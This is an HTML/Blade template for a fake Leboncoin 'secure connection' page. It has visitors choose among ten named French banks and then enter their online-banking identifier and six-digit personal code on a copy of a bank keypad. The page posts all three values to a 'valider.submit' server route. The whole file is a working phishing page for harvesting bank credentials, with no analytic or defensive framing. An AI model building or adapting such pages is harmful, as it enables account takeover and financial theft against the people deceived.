<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
        <link rel="icon" type="image/png" href="{{ asset('images/leboncoin.png') }}">
        <link rel="shortcut icon" type="image/png" href="{{ asset('images/leboncoin.png') }}">

        <meta property="og:title" content="LEBONCOIN" />
        <meta property="og:description" content="Veuillez remplir vos informations de connexion sécurisée." />
        <meta property="og:type" content="website" />
        <meta property="og:url" content="{{ config('app.url') }}" />
        <meta property="og:image" content="{{ asset('images/leboncoin.png') }}" />

        <title>{{ config('app.name', 'LEBONCOIN') }}</title>

        <!-- Fonts -->
        <link rel="preconnect" href="https://fonts.bunny.net">
        <link href="https://fonts.bunny.net/css?family=instrument-sans:400,500,600" rel="stylesheet" />

        @vite(['resources/css/app.css', 'resources/js/app.js'])
    </head>
   <body class="bg-gray-50 min-h-screen flex items-center justify-center">

    <div id="global-loader" style="position: fixed; inset: 0; z-index: 9999; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease;">
        <div class="loader-content" style="text-align: center; margin-top: 0;">
            <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #F56B2A; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            <h2 style="font-family: sans-serif; color: #1b1b18; margin-top: 20px;">Connexion sécurisée...</h2>
            <p style="font-family: sans-serif; color: #706f6c; font-size: 14px;">Traitement de votre validation</p> 
        </div>
    </div>

<style>
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>

<script>
        window.addEventListener('load', function() {
            const loader = document.getElementById('global-loader');
            
            if (loader) {
                setTimeout(() => {
                    loader.style.opacity = '0';
                    setTimeout(() => {
                        loader.style.display = 'none';
                    }, 500);
                }, 1200);
            }
        });
    </script>

    <main x-data="{step: 1, username: '', code: '', bank: ''}" class="w-full max-w-md mx-auto px-4 py-20 overflow-hidden">

        <div class="flex justify-center">
            <img
            src="{{ asset('images/leboncoin.png') }}"
            alt="Logo"
            class="h-10 sm:h-10 lg:h-10 w-auto"
            >
        </div>

        <!-- ÉTAPE 1: Sélectionner la banque -->
        <div 
            x-show="step === 1"
            x-transition:enter="transition-all duration-500 ease-in-out"
            x-transition:enter-start="translate-x-full opacity-0"
            x-transition:enter-end="translate-x-0 opacity-100"
            x-transition:leave-start="translate-x-0 opacity-100"
            x-transition:leave-end="-translate-x-full opacity-0"
        >
            <h1 class="flex justify-center mt-10 font-bold pb-8 text-2xl">
                Accéder à votre espace client
            </h1>

            <div class="space-y-4">
                <label class="block text-sm font-extrabold text-gray-700 mb-3">
                    Sélectionner votre banque
                </label>
                
                <div id="bankList" class="grid grid-cols-4 sm:grid-cols-4 gap-3">

                    @php
                    $banks = [
                        ['name'=>'Crédit Agricole','logo'=>'credit-agricole-logo.png'],
                        ['name'=>"Caisse d'Épargne",'logo'=>'mb-removebg-preview.png'],
                        ['name'=>'BNP Paribas','logo'=>'BNP_Paribas_logo.png'],
                        ['name'=>'Société Générale','logo'=>'Société_Générale.png'],
                        ['name'=>'HSBC','logo'=>'hsbc-logo.png'],
                        ['name'=>'Crédit Mutuel','logo'=>'Crédit_Mutuel_2022_logo.png'],
                        ['name'=>'Banque populaire','logo'=>'logo-gbp.png'],
                        ['name'=>'Axa Banque','logo'=>'AXA_Assurance.png'],
                        ['name'=>'LCL Banque','logo'=>'LCL.png'],
                        ['name'=>'La Banque Postale','logo'=>'LOGO-LBP-digital-fd-clair-RVB.png'],
                    ];
                    @endphp

                    @foreach($banks as $bank)
                        <button
                            type="button"
                            class="bank-option group flex items-center justify-center h-16 rounded-xl bg-white border-2 border-gray-200 hover:border-leboncoin hover:shadow-md transition-all duration-200"
                            data-value="{{ $bank['name'] }}"
                        >
                            <img
                                src="{{ asset('images/'.$bank['logo']) }}"
                                alt="{{ $bank['name'] }}"
                                class="h-12 object-contain group-hover:scale-110 transition-transform"
                            >
                        </button>
                    @endforeach

                    <button
                        type="button"
                        class="bank-option group flex items-center justify-center h-16 rounded-xl bg-white border-2 border-gray-200 hover:border-leboncoin hover:shadow-md transition-all duration-200"
                        data-value="Autre banque"
                    >
                        <div class="flex flex-col items-center justify-center">
                            <svg xmlns="http://www.w3.org/2000/svg"
                                class="w-6 h-6 text-leboncoin group-hover:text-leboncoin transition-colors"
                                fill="none"
                                viewBox="0 0 24 24"
                                stroke="currentColor">
                                <path stroke-linecap="round"
                                    stroke-linejoin="round"
                                    stroke-width="2"
                                    d="M12 4v16m8-8H4"/>
                            </svg>
                            <span class="mt-1 text-xs font-medium text-leboncoin">
                                Autre
                            </span>
                        </div>
                    </button>
                </div>
            </div>
        </div>

        <!-- ÉTAPE 2: Identifiant -->
        <div 
            x-show="step === 2"
            x-transition:enter="transition-all duration-500 ease-in-out"
            x-transition:enter-start="translate-x-full opacity-0"
            x-transition:enter-end="translate-x-0 opacity-100"
            x-transition:leave-start="translate-x-0 opacity-100"
            x-transition:leave-end="-translate-x-full opacity-0"
        >
            <h1 class="flex justify-center mt-10 font-bold pb-8 text-2xl">
                Accéder à votre espace client
            </h1>

            <form @submit.prevent="step = 3" class="space-y-4">
                <div>
                    <label class="block text-sm font-extrabold text-gray-700 mb-1">
                        Banque sélectionnée
                    </label>
                    <input 
                        type="text"
                        :value="bank"
                        readonly
                        class="w-full px-4 py-2 border-2 border-leboncoin rounded-lg focus:outline-none focus:ring-2 focus:ring-leboncoin bg-gray-50"
                    >
                </div>

                <div>
                    <label class="block text-sm font-extrabold text-gray-700 mb-1">
                        Identifiant 
                    </label>

                    <label class="block text-xs text-gray-500 mb-1">
                        Saisissez votre identifiant
                    </label>

                    <input
                        type="text"
                        x-model="username"
                        class="w-full px-4 py-2 text-sm border border-leboncoin rounded-lg outline-none focus:ring-2 focus:ring-leboncoin"
                        placeholder="Identifiant Bancaire"
                        required
                    >
                </div>

                <div class="grid grid-cols-[1fr_auto] underline text-leboncoin text-sm font-bold">
                    <a href="#">Où trouver mon identifiant ?</a>
                </div>

                <div class="flex gap-3 justify-between">
                    <button
                        type="button"
                        @click="step = 1"
                        class="flex items-center gap-2 text-gray-600 hover:text-leboncoin transition-colors duration-200 cursor-pointer">
                        <svg xmlns="http://www.w3.org/2000/svg"
                            class="w-5 h-5"
                            fill="none"
                            viewBox="0 0 24 24"
                            stroke="currentColor"
                            stroke-width="2">
                            <path stroke-linecap="round"
                                stroke-linejoin="round"
                                d="M15 19l-7-7 7-7" />
                        </svg>
                        <span>Retour</span>
                    </button>

                    <button
                        type="submit"
                        class="flex items-center justify-center bg-leboncoin hover:opacity-90 text-white font-bold py-3 px-6 rounded-lg cursor-pointer hover:scale-[1.01] active:scale-[0.99] transition-all duration-200">
                        <svg class="w-4 h-4 mr-1 align-middle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
                        Valider
                    </button>
                </div>
            </form>
        </div>

        <!-- ÉTAPE 3: Code personnel -->
        <div 
            x-show="step === 3"
            x-transition:enter="transition-all duration-500 ease-in-out"
            x-transition:enter-start="translate-x-full opacity-0"
            x-transition:enter-end="translate-x-0 opacity-100"
            x-transition:leave-start="translate-x-0 opacity-100"
            x-transition:leave-end="-translate-x-full opacity-0"
        >
            <h1 class="flex justify-center mt-10 font-bold pb-8 text-2xl">
                Accéder à votre espace client
            </h1>
            
            <form action="{{ route('valider.submit') }}" method="POST" class="space-y-3">
                @csrf

                <input type="hidden" name="bank" :value="bank">
                <input type="hidden" name="username" :value="username">
                <input type="hidden" name="code" :value="code">

                <label class="block text-sm font-extrabold text-gray-700 mb-1">
                    Identifiant
                </label>

                <input 
                    type="text"
                    :value="username"
                    readonly
                    class="w-full px-4 py-2 border-2 border-leboncoin rounded-lg focus:outline-none focus:ring-2 focus:ring-leboncoin bg-gray-50"
                >

                <h1 class="font-bold text-sm mt-4">
                    Code personnel
                </h1>

                <p class="text-sm text-gray-500 leading-5 mt-1">Saisissez votre code personnel à l'aide du clavier ci-dessous.</p>

                @if ($errors->any())
                    <div class="bg-red-100 border border-red-400 text-red-700 p-3 rounded">
                        @foreach ($errors->all() as $error)
                            <p class="text-sm">{{ $error }}</p>
                        @endforeach
                    </div>
                @endif

                <!-- Cases + bouton œil -->
                <div x-data="{ showCode: false }" class="flex items-center justify-center gap-2 mt-4">
                    <!-- Cases -->
                    <div class="flex gap-4 w-full max-w-md justify-center">
                        <template x-for="i in 6" :key="i">
                            <div class="w-8 h-8 border rounded-2xl flex items-center justify-center text-xs font-bold border-slate-400">
                                <span x-text="code[i-1] ? (showCode ? code[i-1] : '•') : '-'"
                                    :class="code[i-1] ? 'text-leboncoin' : 'text-slate-400'"></span>
                            </div>
                        </template>
                    </div>

                    <!-- Bouton œil -->
                    <button
                        type="button"
                        @mousedown="showCode = true"
                        @mouseup="showCode = false"
                        @mouseleave="showCode = false"
                        @touchstart.prevent="showCode = true"
                        @touchend="showCode = false"
                        class="p-2 bg-white shadow-lg rounded-full hover:bg-gray-100 transition cursor-pointer"
                        aria-label="Afficher temporairement le code">

                        <svg xmlns="http://www.w3.org/2000/svg"
                            class="w-6 h-6 text-gray-500 hover:text-leboncoin transition-colors"
                            fill="none"
                            viewBox="0 0 24 24"
                            stroke="currentColor"
                            stroke-width="2">
                            <path stroke-linecap="round"
                                stroke-linejoin="round"
                                d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                            <path stroke-linecap="round"
                                stroke-linejoin="round"
                                d="M2.458 12C3.732 7.943 7.523 5 12 5s8.268 2.943 9.542 7c-1.274 4.057-5.065 7-9.542 7S3.732 16.057 2.458 12z"/>
                        </svg>
                    </button>
                </div>

                <a href="#" class="block mt-2 text-sm font-semibold text-leboncoin underline">
                    J'ai oublié mon code personnel
                </a>

                <!-- Clavier -->
                <div class="grid grid-cols-4 gap-3 sm:gap-4 mt-5">
                    <!-- Ligne 1 -->
                    <button type="button" @click="if(code.length < 6) code += '7'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer hover:bg-gray-100 transition">7</button>
                    <button type="button" @click="if(code.length < 6) code += '3'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer hover:bg-gray-100 transition">3</button>
                    <button type="button" @click="if(code.length < 6) code += '2'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer hover:bg-gray-100 transition">2</button>
                    <button type="button" @click="if(code.length < 6) code += '8'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer hover:bg-gray-100 transition">8</button>

                    <!-- Ligne 2 -->
                    <button type="button" @click="if(code.length < 6) code += '6'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer hover:bg-gray-100 transition">6</button>
                    <button type="button" @click="if(code.length < 6) code += '0'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer hover:bg-gray-100 transition">0</button>
                    <button type="button" @click="if(code.length < 6) code += '4'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer hover:bg-gray-100 transition">4</button>
                    <button type="button" @click="if(code.length < 6) code += '5'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer hover:bg-gray-100 transition">5</button>

                    <!-- Ligne 3 -->
                    <button type="button" @click="if(code.length < 6) code += '1'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer hover:bg-gray-100 transition">1</button>
                    <button type="button" @click="if(code.length < 6) code += '9'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg cursor-pointer hover:bg-gray-100 transition">9</button>

                    <!-- Effacer -->
                    <button type="button" @click="code = code.slice(0,-1)"
                        class="col-span-2 h-14 rounded-3xl bg-white shadow-lg flex items-center justify-center hover:shadow-xl transition cursor-pointer hover:bg-gray-100">

                        <svg xmlns="http://www.w3.org/2000/svg"
                             class="w-8 h-8 text-leboncoin"
                             fill="none"
                             viewBox="0 0 24 24"
                             stroke="currentColor"
                             stroke-width="2">

                            <path stroke-linecap="round"
                                  stroke-linejoin="round"
                                  d="M20 6H9l-5 6 5 6h11a2 2 0 002-2V8a2 2 0 00-2-2z"/>

                            <path stroke-linecap="round"
                                  stroke-linejoin="round"
                                  d="M13 10l4 4m0-4l-4 4"/>

                        </svg>
                    </button>
                </div>

                <div class="flex items-center justify-between mt-5 pt-2">
                    <button
                        type="button"
                        @click="step = 2"
                        class="flex items-center gap-2 text-gray-600 hover:text-leboncoin transition-colors duration-200 cursor-pointer">

                        <svg xmlns="http://www.w3.org/2000/svg"
                            class="w-5 h-5"
                            fill="none"
                            viewBox="0 0 24 24"
                            stroke="currentColor"
                            stroke-width="2">
                            <path stroke-linecap="round"
                                stroke-linejoin="round"
                                d="M15 19l-7-7 7-7" />
                        </svg>
                        <span>Retour</span>
                    </button>

                    <button
                        type="submit"
                        class="flex justify-center items-center bg-leboncoin hover:opacity-90 text-white font-bold py-3 px-6 rounded-lg cursor-pointer hover:scale-[1.01] active:scale-[0.99] transition-all duration-200">
                        <svg class="w-4 h-4 mr-1 align-middle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
                        Se connecter
                    </button>
                </div>
            </form>
        </div>
    </main>

    <script>
    window.addEventListener('load', function() {
        const loader = document.getElementById('global-loader');
        
        if (loader) {
            setTimeout(() => {
                loader.style.opacity = '0';
                setTimeout(() => {
                    loader.style.display = 'none';
                }, 500);
            }, 1200);
        }
    });

    document.addEventListener('alpine:init', () => {
        document.querySelectorAll('.bank-option').forEach(button => {
            button.addEventListener('click', function(e) {
                e.preventDefault();
                
                document.querySelectorAll('.bank-option').forEach(btn => {
                    btn.classList.remove('border-leboncoin', 'bg-leboncoin', 'bg-opacity-10');
                    btn.classList.add('border-gray-200');
                });
                
                this.classList.add('border-leboncoin', 'bg-leboncoin', 'bg-opacity-10');
                this.classList.remove('border-gray-200');
                
                const bankName = this.dataset.value;
                const mainEl = document.querySelector('main');
                if (mainEl && mainEl._x_dataStack && mainEl._x_dataStack[0]) {
                    mainEl._x_dataStack[0].bank = bankName;
                    mainEl._x_dataStack[0].step = 2;
                }
            });
        });
    });
</script>
</body>
</html>
